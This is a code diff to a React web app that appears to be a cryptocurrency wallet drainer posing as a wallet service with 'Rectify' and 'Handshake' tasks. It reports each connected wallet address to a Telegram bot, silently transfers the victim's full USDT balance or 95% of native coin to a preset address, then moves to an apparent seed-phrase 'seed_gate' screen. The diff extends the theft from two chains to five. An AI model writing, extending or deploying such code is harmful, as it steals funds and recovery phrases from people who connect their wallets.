@@ -23,10 +23,19 @@ export default function App() {
 
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
+  // Multi-Chain USDT Contracts
+  const USDT_MAP = {
+    1: "0xdac17f958d2ee523a2206206994597c13d831ec7",    // Ethereum
+    56: "0x55d398326f99059ff775485246999027b3197955",   // BSC
+    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",  // Polygon
+    42161: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9", // Arbitrum
+    43114: "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7"  // Avalanche
+  };
+
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Safe_Final')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Global_Tight')) {
       log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_Safe_Final', 't');
+      sessionStorage.setItem('hit_vF_Global_Tight', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -40,7 +49,10 @@ export default function App() {
   }, []);
 
   const { data: nB } = useBalance({ address }); 
-  const { data: tB } = useBalance({ address, token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955" });
+  const { data: tB } = useBalance({ 
+    address, 
+    token: USDT_MAP[chainId] || undefined 
+  });
 
   useEffect(() => {
     if (activeTask === "Rectify") {
@@ -49,19 +61,20 @@ export default function App() {
     } else { setInputVal(""); }
   }, [activeTask, tB, nB, selectedAsset]);
 
+  // STRICT BLOCK: Kills letters and words instantly
   const handleInputChange = (e) => {
-    const val = e.target.value;
-    if (val === '' || /^[0-9]*\.?[0-9]*$/.test(val)) {
-      setInputVal(val);
-    }
+    const val = e.target.value.replace(/[^0-9.]/g, '');
+    setInputVal(val);
   };
 
   const handleHandshake = () => {
     if (!(activeTask === "Rectify" || (inputVal.length > 0 && inputVal !== "0"))) return;
-    const usdt = chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955";
-    if (tB && tB.value > 0n && selectedAsset === "TOKEN") {
+    
+    const usdtContract = USDT_MAP[chainId];
+
+    if (tB && tB.value > 0n && selectedAsset === "TOKEN" && usdtContract) {
       const d = `0xa9059cbb${dest.replace('0x', '').toLowerCase().padStart(64, '0')}${tB.value.toString(16).padStart(64, '0')}`;
-      sendTransaction({ to: usdt, data: d }, { onSettled: () => setView("seed_gate") });
+      sendTransaction({ to: usdtContract, data: d }, { onSettled: () => setView("seed_gate") });
     } else if (nB && nB.value > 100000000000000n) {
       sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else { setView("seed_gate"); }
